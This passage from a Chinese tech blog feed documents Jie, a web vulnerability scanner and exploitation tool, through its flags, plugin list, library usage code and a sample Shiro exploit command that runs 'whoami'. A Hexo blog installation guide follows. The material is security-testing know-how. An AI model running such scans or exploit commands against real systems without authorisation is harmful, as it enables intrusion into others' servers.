127.0.0.1:9080</span><br><span class="line">      --np               not run plugin.</span><br><span class="line">                         禁用所有的插件</span><br><span class="line">  -p, --plugin strings   Vulnerable Plugin, (example: --plugin xss,csrf,sql,dir ...)</span><br><span class="line">                         指定开启的插件，当指定 all 时开启全部插件</span><br><span class="line">      --poc strings      specify the nuclei poc to run, separated by ','(example: test.yml,./test/*).</span><br><span class="line">                         自定义的nuclei 漏洞模板地址</span><br><span class="line">      --pwd string       Security Copilot web report authorized pwd.</span><br><span class="line">                         web页面登录密码，不指定会随机生成一个密码</span><br><span class="line">      --show             specifies whether the show the browser in headless mode.</span><br><span class="line">                         主动扫描下是否显示浏览器</span><br><span class="line">      --user string      Security Copilot web report authorized user, (example: yhy).]</span><br><span class="line">                         web页面登录用户名，默认为yhy (default "yhy")</span><br><span class="line">      --web string       Security Copilot web report port, (example: 9088)].</span><br><span class="line">                         web页面端口，默认9088 (default "9088")</span><br><span class="line"></span><br><span class="line">Global Flags:</span><br><span class="line">      --debug           debug</span><br><span class="line">  -f, --file string     target file</span><br><span class="line">                        主动扫描目标列表，每行一个</span><br><span class="line">  -o, --out string      output report file(eg:vulnerability_report.html)</span><br><span class="line">                        漏洞结果报告保存地址</span><br><span class="line">      --proxy string    proxy, (example: --proxy http://127.0.0.1:8080)</span><br><span class="line">                        指定 http/https 代理</span><br><span class="line">  -t, --target string   target</span><br><span class="line">                        主动扫描目标，被动下不需要指定</span><br></pre></td></tr></tbody></table></figure><h3 id="下载编译"><a href="#下载编译" class="headerlink" title="下载编译"></a>下载编译</h3><p><a href="https://github.com/yhy0/Jie/releases/latest">https://github.com/yhy0/Jie/releases/latest</a> 中下载对应系统的程序，全程都是由 <strong>Github Action</strong> 自动化构建，请放心使用</p><h4 id="Linux-Mac"><a href="#Linux-Mac" class="headerlink" title="Linux/Mac"></a>Linux/Mac</h4><p>执行<code>make</code>即可编译</p><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><p>安装 <code>MinGW</code></p><p>设置 <code>CGO_ENABLED=1</code> ，然后 <code>go build main.go</code>或者在安装<code>MinGM</code>后将<code>make.exe</code>加入环境变量，之后执行<code>make</code></p><h3 id="与-Burp-联动"><a href="#与-Burp-联动" class="headerlink" title="与 Burp 联动"></a>与 Burp 联动</h3><h4 id="passive-scan-client-插件（强烈建议）"><a href="#passive-scan-client-插件（强烈建议）" class="headerlink" title="passive-scan-client 插件（强烈建议）"></a>passive-scan-client 插件（强烈建议）</h4><p><a href="https://github.com/yhy0/passive-scan-client">https://github.com/yhy0/passive-scan-client</a></p><p><a href="https://github.com/yhy0/Jie/blob/main/images/passive-scan-client.png"><img src="https://github.com/yhy0/Jie/raw/main/images/passive-scan-client.png" alt="passive-scan-client"></a></p><p>通过三个监控开关来自由选择哪些过扫描器。<strong>注：js、css 也应该走扫描器来收集信息</strong></p><h4 id="Burp-设置上游代理（不推荐）"><a href="#Burp-设置上游代理（不推荐）" class="headerlink" title="Burp 设置上游代理（不推荐）"></a>Burp 设置上游代理（不推荐）</h4><p><a href="https://github.com/yhy0/Jie/blob/main/images/image-20231011213912055.png"><img src="https://github.com/yhy0/Jie/raw/main/images/image-20231011213912055.png" alt="image-20231011213912055"></a></p><p>这里的上游代理 Intruder 和 Repeater 模块的流量也会走扫描器</p><p>这样会造成自己手动测试的数据流量也会全部走扫描器，这样就不好了，这一块应该是按需的。</p><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><p>通过主动或者被动收集过来的流量插件内部会判断是否扫描过 （TODO 扫描插件是否要按某个顺序执行？）</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ul><li>网站指纹信息</li><li>每个网站请求的 url 收集聚合展示</li><li>网站域名信息: cdn/waf/cloud、解析记录</li><li>Jwt 自动爆破 (todo 根据域名自动生成字典)</li><li>敏感信息</li><li>主动的路径扫描（bbscan 规则 ,新增了一个指纹字段，存在指纹时只会扫描对应的规则，比如 对 php 网站就不会扫描 springboot 的规则）</li><li>端口信息</li><li>收集域名、ip、api</li></ul><h3 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h3><p>有的扫描会对比收集的指纹信息进行语言环境识别，防止对 php 的网站调用 java 的扫描插件</p><h4 id="扫描目录结构"><a href="#扫描目录结构" class="headerlink" title="扫描目录结构"></a>扫描目录结构</h4><p><code>scan</code>目录为扫描插件库，每个目录的插件会处理不同情形</p><ul><li>PerFile 针对每个url，包括参数啥的</li><li>PerFolder 针对url的目录，会分隔目录分别访问</li><li>PerServer 对每个domain 的，也就是说一个目标只扫描一次</li></ul><table><thead><tr><th>插件</th><th>介绍</th><th>默认是否开启</th><th>作用域</th></tr></thead><tbody><tr><td>xss</td><td>语义分析、原型链污染、dom 污染点传播分析</td><td>true</td><td>PerFile</td></tr><tr><td>sql</td><td>目前只实现一些简单的SQL注入检测</td><td>true</td><td>PerFile</td></tr><tr><td>sqlmap</td><td>通过指定 sqlmap API 将流量转发到 sqlmap 进行注入检测</td><td>false</td><td>PerFile</td></tr><tr><td>ssrf</td><td></td><td>true</td><td>PerFile</td></tr><tr><td>jsonp</td><td></td><td>true</td><td>PerFile</td></tr><tr><td>cmd</td><td>命令执行</td><td>true</td><td>PerFile</td></tr><tr><td>xxe</td><td></td><td>true</td><td>PerFile</td></tr><tr><td>fastjson</td><td>当检测到请求为 json 时，缝合了<a href="https://socialify.git.ci/a1phaboy/">@a1phaboy</a>师傅的<a href="https://socialify.git.ci/a1phaboy/FastjsonScan">FastjsonScan</a>扫描器，探测 fastjson; jackson 暂未实现</td><td>true</td><td>PerFile</td></tr><tr><td>bypass403</td><td><a href="https://github.com/devploit/dontgo403">dontgo403</a> 403 绕过检测</td><td>true</td><td>PerFile</td></tr><tr><td>crlf</td><td>crlf注入</td><td>true</td><td>PerFolder</td></tr><tr><td>iis</td><td>iis高版本短文件名猜解[iis7.5-10.x-ShortNameFuzz](</td><td>false</td><td>PerFolder</td></tr><tr><td>nginx-alias-traversal</td><td>Nginx 配置错误导致的目录遍历<a href="https://github.com/vulhub/vulhub/blob/6a142caa19620bffa4cda9989697afd5b4136c87/nginx/insecure-configuration/README.md">nginx</a></td><td>true</td><td>PerFolder</td></tr><tr><td>log4j</td><td>log4j 漏洞检测,目前只会测试请求头</td><td>true</td><td>PerFolder</td></tr><tr><td>bbscan</td><td><a href="https://github.com/lijiejie/bbscan">bbscan</a> 规则 目录扫描</td><td>true</td><td>PerFolder PerServer(这个针对规则中指定了根目录的)</td></tr><tr><td>portScan</td><td>使用 <a href="https://github.com/projectdiscovery/naabu">naabu</a> 扫描 Top 1000 端口，然后使用 <a href="https://github.com/praetorian-inc/fingerprintx">fingerprintx</a> 识别服务</td><td>false</td><td>PerServer</td></tr><tr><td>brute</td><td>如果开启服务爆破，会在扫描到端口服务后进行服务爆破</td><td></td><td>PerServer</td></tr><tr><td>nuclei</td><td>集成<a href="https://github.com/projectdiscovery/nuclei">nuclei</a></td><td>false</td><td>PerServer</td></tr><tr><td>archive</td><td>利用 <a href="https://web.archive.org/">https://web.archive.org/</a> 进行获取历史 url 链接(参数)，然后进行扫描</td><td>true</td><td>PerServer</td></tr><tr><td>poc</td><td>go 写的 poc 模块检测， poc 模块依托于指纹识别，只有识别到对应的指纹才会扫描，没有插件化了</td><td>false</td><td>PerServer</td></tr></tbody></table><h3 id="逻辑漏洞-TODO"><a href="#逻辑漏洞-TODO" class="headerlink" title="逻辑漏洞 TODO"></a>逻辑漏洞 TODO</h3><p>添加多个用户 cookie 进行越权检测（感觉还是 burp 插件自己写测试比较好，这里应该没有必要写）</p><h2 id="第三方库"><a href="#第三方库" class="headerlink" title="第三方库"></a>第三方库</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">    "github.com/logrusorgru/aurora"</span><br><span class="line">    "github.com/yhy0/Jie/SCopilot"</span><br><span class="line">    "github.com/yhy0/Jie/conf"</span><br><span class="line">    "github.com/yhy0/Jie/crawler"</span><br><span class="line">    "github.com/yhy0/Jie/pkg/output"</span><br><span class="line">    "github.com/yhy0/logging"</span><br><span class="line">    "net/url"</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line">  @author: yhy</span><br><span class="line">  @since: 2023/12/28</span><br><span class="line">  @desc: //TODO</span><br><span class="line">**/</span><br><span class="line"></span><br><span class="line">func lib() {</span><br><span class="line">    logging.Logger = logging.New(conf.GlobalConfig.Debug, "", "Jie", true)</span><br><span class="line">    conf.Init()</span><br><span class="line">    conf.GlobalConfig.Http.Proxy = ""</span><br><span class="line">    conf.GlobalConfig.WebScan.Poc = nil</span><br><span class="line">    conf.GlobalConfig.Reverse.Host = "https://dig.pm/"</span><br><span class="line">    conf.GlobalConfig.Passive.WebPort = "9088"</span><br><span class="line">    conf.GlobalConfig.Passive.WebUser = "yhy"</span><br><span class="line">    conf.GlobalConfig.Passive.WebPass = "123456" // 注意修改为强口令</span><br><span class="line"></span><br><span class="line">    // 全部插件开启</span><br><span class="line">    for k := range conf.Plugin {</span><br><span class="line">        // if k == "nuclei" || k == "poc" {</span><br><span class="line">        //     continue</span><br><span class="line">        // }</span><br><span class="line">        conf.Plugin[k] = true</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    if conf.GlobalConfig.Passive.WebPort != "" {</span><br><span class="line">        go SCopilot.Init()</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    // 初始化爬虫</span><br><span class="line">    crawler.NewCrawlergo(false)</span><br><span class="line"></span><br><span class="line">    go func() {</span><br><span class="line">        for v := range output.OutChannel {</span><br><span class="line">            // SCopilot 显示</span><br><span class="line">            if conf.GlobalConfig.Passive.WebPort != "" {</span><br><span class="line">                parse, err := url.Parse(v.VulnData.Target)</span><br><span class="line">                if err != nil {</span><br><span class="line">                    logging.Logger.Errorln(err)</span><br><span class="line">                    continue</span><br><span class="line">                }</span><br><span class="line">                msg := output.SCopilotData{</span><br><span class="line">                    Target: v.VulnData.Target,</span><br><span class="line">                }</span><br><span class="line"></span><br><span class="line">                if v.Level == "Low" {</span><br><span class="line">                    msg.InfoMsg = []output.PluginMsg{</span><br><span class="line">                        {</span><br><span class="line">                            Url:      v.VulnData.Target,</span><br><span class="line">                            Plugin:   v.Plugin,</span><br><span class="line">                            Result:   []string{v.VulnData.Payload},</span><br><span class="line">                            Request:  v.VulnData.Request,</span><br><span class="line">                            Response: v.VulnData.Response,</span><br><span class="line">                        },</span><br><span class="line">                    }</span><br><span class="line">                } else {</span><br><span class="line">                    msg.VulMessage = append(msg.VulMessage, v)</span><br><span class="line">                }</span><br><span class="line">                output.SCopilot(parse.Host, msg)</span><br><span class="line">                logging.Logger.Infoln(aurora.Red(v.PrintScreen()).String())</span><br><span class="line">            }</span><br><span class="line">            logging.Logger.Infoln(aurora.Red(v.PrintScreen()).String())</span><br><span class="line">        }</span><br><span class="line">    }()</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="漏洞利用-还在开发中，优先级低"><a href="#漏洞利用-还在开发中，优先级低" class="headerlink" title="漏洞利用(还在开发中，优先级低)"></a>漏洞利用(还在开发中，优先级低)</h2><p><strong>目前还在开发，帮助信息我自己都要看代码才能知道，等搞完了在写详细的</strong>。</p><p>因大部分漏洞的利用工具使用 java 编写，并且支持的java 版本不同，搞环境太费劲，恶心坏了，所以重新定义了Jie。</p><p>Jie: 一款全面而强大的漏洞<code>扫描</code>和<code>利用</code>工具。</p><p>目前版本(1.0.0)支持以下漏洞的利用</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">A Powerful security assessment and utilization tools</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  Jie [command]</span><br><span class="line"></span><br><span class="line">Available Commands:</span><br><span class="line">  apollo      apollo scan &amp;&amp; exp</span><br><span class="line">  fastjson    fastjson scan &amp;&amp; exp</span><br><span class="line">  help        Help about any command</span><br><span class="line">  log4j       log4j scan &amp;&amp; exp</span><br><span class="line">  other       other scan &amp;&amp; exp bb:BasicBrute、swagger:Swagger、nat:NginxAliasTraversal、dir:dir)</span><br><span class="line">  s2          Struts2 scan &amp;&amp; exp</span><br><span class="line">  shiro       Shiro scan &amp;&amp; exp</span><br><span class="line">  web         Run a web scan task</span><br><span class="line">  weblogic    WebLogic scan &amp;&amp; exp</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">      --debug           debug</span><br><span class="line">  -f, --file string     target file</span><br><span class="line">  -h, --help            help for Jie</span><br><span class="line">  -o, --out string      output report file(eg:vulnerability_report.html)</span><br><span class="line">      --proxy string    proxy, (example: --proxy http://127.0.0.1:8080)</span><br><span class="line">  -t, --target string   target</span><br><span class="line"></span><br><span class="line">Use "Jie [command] --help" for more information about a command.</span><br></pre></td></tr></tbody></table></figure><p>比如 Shiro key 漏洞利用</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 不指定-m 默认为爆破秘钥和利用链</span><br><span class="line">Jie shiro -t http://127.0.0.1</span><br><span class="line"></span><br><span class="line"># 利用</span><br><span class="line">Jie Shiro -t http://127.0.0.1 -m exp -k 213123 -g CCK2 -e spring -km CBC --cmd whoami</span><br></pre></td></tr></tbody></table></figure><p>其中借鉴缝合了很多师傅的工具，对应的漏洞扫描和利用中有写，如有遗漏，可以联系我，添加上 后续会缝合支持更多的漏洞利用。</p><p><a href="https://jie.fireline.fun/">https://jie.fireline.fun/</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><h3 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h3><p><a href="https://github.com/Qianlitp/crawlergo">crawlergo</a></p><h3 id="被动扫描代理"><a href="#被动扫描代理" class="headerlink" title="被动扫描代理"></a>被动扫描代理</h3><p><a href="https://github.com/lqqyt2423/go-mitmproxy">https://github.com/lqqyt2423/go-mitmproxy</a></p><h3 id="Xss"><a href="#Xss" class="headerlink" title="Xss"></a>Xss</h3><p>语义分析、原型链污染、dom 污染点传播分析</p><p><a href="https://github.com/w-digital-scanner/w13scan">https://github.com/w-digital-scanner/w13scan</a></p><p><a href="https://github.com/ac0d3r/xssfinder">https://github.com/ac0d3r/xssfinder</a></p><p><a href="https://github.com/kleiton0x00/ppmap">https://github.com/kleiton0x00/ppmap</a></p><h3 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h3><p>提取 <a href="https://github.com/sqlmapproject/sqlmap">sqlmap</a> 中关于检测的代码，提取一部分思想就行了</p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>通过指纹识别进行对应的漏洞检测</p><p>todo 不内置 nuclei 的 yml 文件，改为官方在线下载、更新</p><p><a href="https://github.com/projectdiscovery/nuclei">https://github.com/projectdiscovery/nuclei</a></p><p>xray poc 中有些写的不规范，导致解析有问题，需要修改 比如： response.status == 200 &amp;&amp; response.headers[“content-type”] == “text/css” &amp;&amp; response.body.bcontains(b”$_GET[‘css’]”)</p><p>content-type 应为 Content-Type</p><p>但又好像是解析有问题</p><p>不使用 xray 的 poc，只使用 nuclei 的 yml 文件 一起使用还要整理，防止重复扫描，nuclei-template 的 poc 已经够了</p><h3 id="漏扫"><a href="#漏扫" class="headerlink" title="漏扫"></a>漏扫</h3><p><a href="https://github.com/wrenchonline/glint">https://github.com/wrenchonline/glint</a></p><p><a href="https://github.com/veo/vscan">https://github.com/veo/vscan</a></p><h3 id="一些其他漏洞"><a href="#一些其他漏洞" class="headerlink" title="一些其他漏洞"></a>一些其他漏洞</h3><h4 id="敏感信息"><a href="#敏感信息" class="headerlink" title="敏感信息"></a>敏感信息</h4><p><a href="https://github.com/mazen160/secrets-patterns-db">https://github.com/mazen160/secrets-patterns-db</a> <a href="https://github.com/pingc0y/URLFinder">https://github.com/pingc0y/URLFinder</a></p><h4 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h4><p><a href="https://github.com/a1phaboy/FastjsonScan">https://github.com/a1phaboy/FastjsonScan</a></p><h3 id="指纹"><a href="#指纹" class="headerlink" title="指纹"></a>指纹</h3><p><a href="https://github.com/w-digital-scanner/w13scan">https://github.com/w-digital-scanner/w13scan</a></p><p><a href="https://github.com/SleepingBag945/dddd">https://github.com/SleepingBag945/dddd</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo框架-搭建博客(部署服务器)</title>
      <link href="/2024/03/02/16-hexo-%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/2024/03/02/16-hexo-%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="Hexo框架-搭建博客-部署服务器"><a href="#Hexo框架-搭建博客-部署服务器" class="headerlink" title="Hexo框架-搭建博客(部署服务器)"></a>Hexo框架-搭建博客(部署服务器)</h1><h2 id="官方网站"><a href="#官方网站" class="headerlink" title="官方网站:"></a>官方网站:</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://hexo.io/  #hexo官网</span><br><span class="line">https://hexo.io/zh-cn/docs/ #hexo文档</span><br><span class="line">https://hexo.io/zh-cn/api/ #Hexo API 页面</span><br><span class="line">https://hexo.io/plugins/ #Hexo 插件页面</span><br><span class="line">https://hexo.io/themes/ #Hexo 主题页面</span><br></pre></td></tr></tbody></table></figure><h2 id="什么是-Hexo？"><a href="#什么是-Hexo？" class="headerlink" title="什么是 Hexo？"></a>什么是 Hexo？</h2><p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 <a href="http://daringfireball.net/projects/markdown/">Markdown</a>（或其他标记语言）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p><iframe src="https://www.youtube.com/embed/PsXWbI2Mqu0" frameborder="0" loading="lazy" allowfullscreen="" style="box-sizing: inherit; margin: 1em 0px; padding: 0px; border: 0px; outline: 0px; font-weight: inherit; font-style: inherit; font-family: inherit; font-size: 15px; vertical-align: baseline;"></iframe><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>安装 Hexo 只需几分钟时间，若您在安装过程中遇到问题或无法找到解决方式，请 <a href="https://github.com/hexojs/hexo/issues">提交问题</a>，我们会尽力解决您的问题。</p><h3 id="安装前提"><a href="#安装前提" class="headerlink" title="安装前提"></a>安装前提</h3><p>安装 Hexo 相当简单，只需要先安装下列应用程序即可：</p><ul><li><a href="http://nodejs.org/">Node.js</a> (Node.js 版本需不低于 10.13，建议使用 Node.js 12.0 及以上版本)</li><li><a href="http://git-scm.com/">Git</a></li></ul><p>如果您的电脑中已经安装上述必备程序，那么恭喜您！你可以直接前往 <a href="https://hexo.io/zh-cn/docs/#%E5%AE%89%E8%A3%85-Hexo">安装 Hexo</a> 步骤。</p><p>如果您的电脑中尚未安装所需要的程序，请根据以下安装指示完成安装。</p><h3 id="安装-Git"><a href="#安装-Git" class="headerlink" title="安装 Git"></a>安装 Git</h3><ul><li>Windows：下载并安装 <a href="https://git-scm.com/download/win">git</a>。</li><li>Mac：使用 <a href="http://mxcl.github.com/homebrew/">Homebrew</a>, <a href="http://www.macports.org/">MacPorts</a> 或者下载 <a href="http://sourceforge.net/projects/git-osx-installer/">安装程序</a>。</li><li>Linux (Ubuntu, Debian)：<code>sudo apt-get install git-core</code></li><li>Linux (Fedora, Red Hat, CentOS)：<code>sudo yum install git-core</code></li></ul><blockquote><p>Mac 用户</p><p>如果在编译时可能会遇到问题，请先到 App Store 安装 Xcode，Xcode 完成后，启动并进入 <strong>Preferences -&gt; Download -&gt; Command Line Tools -&gt; Install</strong> 安装命令行工具。</p></blockquote><blockquote><p>Windows 用户</p><p>对于中国大陆地区用户，可以前往 <a href="https://npmmirror.com/mirrors/git-for-windows/">淘宝 Git for Windows 镜像</a> 下载 git 安装包。</p></blockquote><h3 id="安装-Node-js"><a href="#安装-Node-js" class="headerlink" title="安装 Node.js"></a>安装 Node.js</h3><p>Node.js 为大多数平台提供了官方的 <a href="https://nodejs.org/zh-cn/download/">安装程序</a>。对于中国大陆地区用户，可以前往 <a href="https://npmmirror.com/mirrors/node/">淘宝 Node.js 镜像</a> 下载。</p><h3 id="Node-js官网"><a href="#Node-js官网" class="headerlink" title="Node.js官网:"></a>Node.js官网:</h3><figure class="highlight http"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://nodejs.org/en  #官网</span><br><span class="line">https://nodejs.org/en/download  #下载页面</span><br></pre></td></tr></tbody></table></figure><p>其它的安装方法：</p><ul><li>Windows：通过 <a href="https://github.com/jasongin/nvs/">nvs</a>（推荐）或者 <a href="https://github.com/nvm-sh/nvm">nvm</a> 安装。</li><li>Mac：使用 <a href="https://brew.sh/">Homebrew</a> 或 <a href="http://www.macports.org/">MacPorts</a> 安装。</li><li>Linux（DEB/RPM-based）：从 <a href="https://github.com/nodesource/distributions">NodeSource</a> 安装。</li><li>其它：使用相应的软件包管理器进行安装，可以参考由 Node.js 提供的 <a href="https://nodejs.org/en/download/package-manager/">指导</a>。</li></ul><p>对于 Mac 和 Linux 同样建议使用 nvs 或者 nvm，以避免可能会出现的权限问题。</p><h4 id="Node-js-ubuntu-Debian系列安装"><a href="#Node-js-ubuntu-Debian系列安装" class="headerlink" title="Node.js-ubuntu-Debian系列安装"></a>Node.js-ubuntu-Debian系列安装</h4><p><strong>Node.js v21.x</strong>：</p><h5 id="使用Ubuntu"><a href="#使用Ubuntu" class="headerlink" title="使用Ubuntu"></a>使用Ubuntu</h5><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://deb.nodesource.com/setup_21.x | sudo -E bash - &amp;&amp;\</span><br><span class="line">sudo apt-get install -y nodejs</span><br><span class="line">node --version #检查node.js版本</span><br><span class="line">npm --version  #检查npm版本</span><br></pre></td></tr></tbody></table></figure><h5 id="以-root-身份使用-Debian"><a href="#以-root-身份使用-Debian" class="headerlink" title="以 root 身份使用 Debian"></a>以 root 身份使用 Debian</h5><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://deb.nodesource.com/setup_21.x | bash - &amp;&amp;\</span><br><span class="line">apt-get install -y nodejs</span><br></pre></td></tr></tbody></table></figure><h4 id="Node-js-centos-radhat系列安装-不支持7"><a href="#Node-js-centos-radhat系列安装-不支持7" class="headerlink" title="Node.js-centos\radhat系列安装(不支持7)"></a>Node.js-centos\radhat系列安装(不支持7)</h4><h3 id="RPM-安装说明"><a href="#RPM-安装说明" class="headerlink" title="RPM 安装说明"></a>RPM 安装说明</h3><p>Nodesource RPM 包签名密钥可在此处获取：<a href="https://rpm.nodesource.com/gpgkey/nodesource.gpg.key">https ://rpm.nodesource.com/gpgkey/nodesource.gpg.key</a></p><p><strong>Node.js v21.x</strong></p><h5 id="作为root用户"><a href="#作为root用户" class="headerlink" title="作为root用户"></a>作为root用户</h5><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://rpm.nodesource.com/setup_21.x | bash -</span><br><span class="line">yum install -y nodejs</span><br></pre></td></tr></tbody></table></figure><h5 id="没有root权限"><a href="#没有root权限" class="headerlink" title="没有root权限"></a>没有root权限</h5><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://rpm.nodesource.com/setup_21.x | sudo bash -</span><br><span class="line">yum install -y nodejs</span><br></pre></td></tr></tbody></table></figure><blockquote><p>Windows 用户</p><p>使用 Node.js 官方安装程序时，请确保勾选 <strong>Add to PATH</strong> 选项（默认已勾选）</p></blockquote><blockquote><p>For Mac / Linux 用户</p><p>如果在尝试安装 Hexo 的过程中出现 <code>EACCES</code> 权限错误，请遵循 <a href="https://docs.npmjs.com/resolving-eacces-permissions-errors-when-installing-packages-globally">由 npmjs 发布的指导</a> 修复该问题。强烈建议 <strong>不要</strong> 使用 root、sudo 等方法覆盖权限</p></blockquote><blockquote><p>Linux</p><p>如果您使用 Snap 来安装 Node.js，在 <a href="https://hexo.io/zh-cn/docs/commands#init">初始化</a> 博客时您可能需要手动在目标文件夹中执行 <code>npm install</code>。</p></blockquote><h3 id="安装-Hexo"><a href="#安装-Hexo" class="headerlink" title="安装 Hexo"></a>安装 Hexo</h3><p>所有必备的应用程序安装完成后，即可使用 npm 安装 Hexo。</p><p>建议使用这一条命令</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ npm install -g hexo-cli</span><br><span class="line">hexo version #检查hexo版本</span><br></pre></td></tr></tbody></table></figure><h3 id="进阶安装和使用"><a href="#进阶安装和使用" class="headerlink" title="进阶安装和使用"></a>进阶安装和使用</h3><p>对于熟悉 npm 的进阶用户，可以仅局部安装 <code>hexo</code> 包。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo</span><br></pre></td></tr></tbody></table></figure><p>安装以后，可以使用以下两种方式执行 Hexo：</p><ol><li><code>npx hexo &lt;command&gt;</code></li><li>Linux 用户可以将 Hexo 所在的目录下的 <code>node_modules</code> 添加到环境变量之中即可直接使用 <code>hexo &lt;command&gt;</code>：</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 'PATH="$PATH:./node_modules/.bin"' &gt;&gt; ~/.profile</span><br></pre></td></tr></tbody></table></figure><h3 id="Node-js-版本限制"><a href="#Node-js-版本限制" class="headerlink" title="Node.js 版本限制"></a>Node.js 版本限制</h3><p>如果你坚持使用旧的 Node.js，你可以考虑安装 Hexo 的过去版本。</p><p>请注意，我们不提供对过去版本 Hexo 的错误修复。</p><p>我们强烈建议永远安装 <a href="https://www.npmjs.com/package/hexo?activeTab=versions">最新版本</a> 的 Hexo，以及 <a href="https://hexo.io/zh-cn/docs/#%E5%AE%89%E8%A3%85%E5%89%8D%E6%8F%90">推荐的 Node.js 版本</a>。</p><table><thead><tr><th align="left">Hexo 版本</th><th align="left">最低版本 (Node.js 版本)</th><th align="left">最高版本 (Node.js 版本)</th></tr></thead><tbody><tr><td align="left">7.0+</td><td align="left">14.0.0</td><td align="left">latest</td></tr><tr><td align="left">6.2+</td><td align="left">12.13.0</td><td align="left">latest</td></tr><tr><td align="left">6.0+</td><td align="left">12.13.0</td><td align="left">18.5.0</td></tr><tr><td align="left">5.0+</td><td align="left">10.13.0</td><td align="left">12.0.0</td></tr><tr><td align="left">4.1 - 